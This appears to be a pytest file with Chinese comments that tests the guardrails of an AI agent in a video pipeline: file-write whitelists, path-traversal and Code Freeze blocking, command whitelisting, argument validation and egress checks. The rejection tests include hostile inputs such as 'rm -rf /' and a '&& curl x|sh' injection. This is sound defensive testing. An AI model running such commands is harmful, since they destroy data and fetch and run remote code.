"""受控工具注册表与 Pipeline 白名单执行器护栏测试（Spec §2.4, §2.5, §5 PR1）。
"""

from pathlib import Path
import pytest

from pipeline.agent.tools import (
    assert_egress_boundary,
    validate_pipeline_command,
    write_episode_file,
)
from pipeline.cloud import validate_extra_args


# ---------------------------------------------------------------------------
# 1. write_episode_file 受限书写工具与 Code Freeze 拦截测试
# ---------------------------------------------------------------------------


def test_write_episode_file_allows_draft_and_topic_with_confirm(tmp_path: Path):
    """creative scope 放行 02-script.draft.md，以及在确认后的 01-topic.md。"""
    draft = write_episode_file(tmp_path, "02-script.draft.md", "# Draft", scope="creative")
    assert draft.exists()
    assert draft.read_text(encoding="utf-8") == "# Draft"

    topic = write_episode_file(tmp_path, "01-topic.md", "# Topic", scope="creative", confirmed=True)
    assert topic.exists()
    assert topic.read_text(encoding="utf-8") == "# Topic"


def test_write_episode_file_rejects_topic_without_confirmation(tmp_path: Path):
    """写 01-topic.md 未获显式确认时必须拦截 (Spec §2.4, B7)。"""
    with pytest.raises(PermissionError, match="显式确认"):
        write_episode_file(tmp_path, "01-topic.md", "# Topic", scope="creative", confirmed=False)


def test_write_episode_file_rejects_out_of_whitelist_files(tmp_path: Path):
    """拦截白名单外文件的写入（如 02-script.md、04-clips.json 等）。"""
    with pytest.raises(PermissionError, match="白名单"):
        write_episode_file(tmp_path, "02-script.md", "# Final", scope="creative")

    with pytest.raises(PermissionError, match="白名单"):
        write_episode_file(tmp_path, "notes.txt", "abc", scope="creative")


def test_write_episode_file_rejects_parent_or_outside_directory(tmp_path: Path):
    """拦截跨目录/父级目录写入（双端 resolve 防穿透，B1-r5）。"""
    ep_dir = tmp_path / "ep01"
    ep_dir.mkdir()

    with pytest.raises(PermissionError):
        write_episode_file(ep_dir, "../02-script.draft.md", "bad", scope="creative")

    with pytest.raises(PermissionError):
        write_episode_file(ep_dir, "subdir/02-script.draft.md", "bad", scope="creative")


def test_write_episode_file_rejects_non_creative_scope(tmp_path: Path):
    """pipeline 与 asset scope 拥有零写权限。"""
    with pytest.raises(PermissionError, match="零写权限"):
        write_episode_file(tmp_path, "02-script.draft.md", "# Draft", scope="pipeline")

    with pytest.raises(PermissionError, match="零写权限"):
        write_episode_file(tmp_path, "02-script.draft.md", "# Draft", scope="asset")


def test_write_episode_file_rejects_writing_pipeline_src(tmp_path: Path):
    """绝不允许写入 pipeline/ 代码源码（Code Freeze 核心护栏）。"""
    from pipeline import paths
    with pytest.raises(PermissionError, match="Code Freeze"):
        write_episode_file(paths.ROOT / "pipeline", "01-topic.md", "bad", scope="creative", confirmed=True)


# ---------------------------------------------------------------------------
# 2. validate_pipeline_command 命令白名单与拒收测试
# ---------------------------------------------------------------------------


def test_validate_pipeline_command_rejects_force_and_guides():
    """/run 命令遇到 --force / --force-all 必须当场拦截并指引增量参数 (Spec §2.4, B4-r18)。"""
    ok, msg, _ = validate_pipeline_command("tts data/episodes/01 --force")
    assert not ok
    assert "禁止在 ava 中使用 --force" in msg
    assert "--redo" in msg or "--apply-patch" in msg

    ok2, msg2, _ = validate_pipeline_command("python -m pipeline.tts data/episodes/01 --force-all")
    assert not ok2
    assert "禁止在 ava 中使用 --force-all" in msg2


def test_validate_pipeline_command_rejects_cloud_down_force():
    """拒收 cloud down --force 销毁性动作并指引先查看 status (Spec §2.4, B1-r10)。"""
    ok, msg, _ = validate_pipeline_command("cloud down --force")
    assert not ok
    assert "cloud down --force" in msg
    assert "cloud status" in msg


def test_validate_pipeline_command_rejects_cloud_exec():
    """绝对拒收 cloud exec（R1-r10）。"""
    ok, msg, _ = validate_pipeline_command("cloud exec 'rm -rf /'")
    assert not ok
    assert "cloud exec" in msg
    assert "永久禁用" in msg


def test_validate_pipeline_command_allows_pipeline_modules():
    """pipeline scope 下放行 9 个制片模块。"""
    for mod in ["check_script", "tts", "clips", "review", "render", "qc", "cover", "bgm", "status"]:
        ok, msg, norm = validate_pipeline_command(f"{mod} data/episodes/01", scope="pipeline")
        assert ok, f"模块 {mod} 应该被放行，却被拒: {msg}"
        assert norm[0:3] == ["python", "-m", f"pipeline.{mod}"]


def test_validate_pipeline_command_rejects_unauthorized_module():
    """拒收非白名单外部命令或任意 bash。"""
    ok, msg, _ = validate_pipeline_command("rm -rf data/", scope="pipeline")
    assert not ok
    assert "不在 pipeline 允许的白名单内" in msg


def test_validate_pipeline_command_asset_scope_phase0_commands():
    """asset scope 下放行 Phase 0 子命令，且 faces 必须 5 个子命令全在 (Y1-r8, Y2-r10)。"""
    # faces 5 个命令全在
    for sub in ["detect", "cluster", "sheet", "name", "presence"]:
        ok, msg, norm = validate_pipeline_command(f"faces {sub} anime_test", scope="asset")
        assert ok, f"faces {sub} 应该被放行，却被拒: {msg}"

    # shots 3 个命令
    for sub in ["build", "frames", "caption-frames"]:
        ok, msg, _ = validate_pipeline_command(f"shots {sub} /path", scope="asset")
        assert ok, f"shots {sub} 应该被放行: {msg}"

    # vindex 2 个命令
    for sub in ["captions", "embed"]:
        ok, msg, _ = validate_pipeline_command(f"vindex {sub} /path", scope="asset")
        assert ok, f"vindex {sub} 应该被放行: {msg}"

    # cloud 子命令
    for sub in ["status", "logs", "doctor", "up", "down", "push", "pull"]:
        ok, msg, _ = validate_pipeline_command(f"cloud {sub}", scope="asset")
        assert ok, f"cloud {sub} 应该被放行: {msg}"

    # asset scope 拒收未授权子命令
    ok_bad, msg_bad, _ = validate_pipeline_command("faces unknown_action", scope="asset")
    assert not ok_bad


# ---------------------------------------------------------------------------
# 3. cloud extra_args 正则校验（Spec §2.4, §5 PR1）
# ---------------------------------------------------------------------------


def test_cloud_extra_args_whitelist_positive_cases():
    """放行正例：--redo 3,7、--redo stale、--floor 0.60、--apply-patch (Spec §2.4 Y3)。"""
    assert validate_extra_args("--redo 3,7") == "--redo 3,7"
    assert validate_extra_args("--redo stale") == "--redo stale"
    assert validate_extra_args("--redo 5") == "--redo 5"
    assert validate_extra_args("--floor 0.60") == "--floor 0.60"
    assert validate_extra_args("--apply-patch") == "--apply-patch"
    assert validate_extra_args("--redo 1,2 --allow-engine-mix") == "--redo 1,2 --allow-engine-mix"


def test_cloud_extra_args_whitelist_rejects_injections_and_invalid_values():
    """拒收 shell 注入、非法值以及布尔旗标带值。"""
    with pytest.raises(ValueError, match="非法"):
        validate_extra_args('--redo "3,7 && curl x|sh"')

    with pytest.raises(ValueError, match="非法"):
        validate_extra_args("--floor abc")

    with pytest.raises(ValueError, match="缺少值"):
        validate_extra_args("--redo")

    with pytest.raises(ValueError, match="不得带值"):
        validate_extra_args("--apply-patch=foo")

    with pytest.raises(ValueError, match="未授权"):
        validate_extra_args("--unauthorized-flag")


# ---------------------------------------------------------------------------
# 4. assert_egress_boundary 出网边界断言测试（Spec §2.5 Y2-r19）
# ---------------------------------------------------------------------------


def test_assert_egress_boundary():
    """断言凭据与未授权路径绝不出网。"""
    assert_egress_boundary("https://api.openai.com", {"role": "user", "content": "请写一段台词"})

    with pytest.raises(PermissionError, match="拦截出网请求"):
        assert_egress_boundary("https://api.openai.com", {"config": "cloud.local.json"})

    with pytest.raises(PermissionError, match="拦截出网请求"):
        assert_egress_boundary("https://api.openai.com", {"audio": "03-audio/manifest.json"})
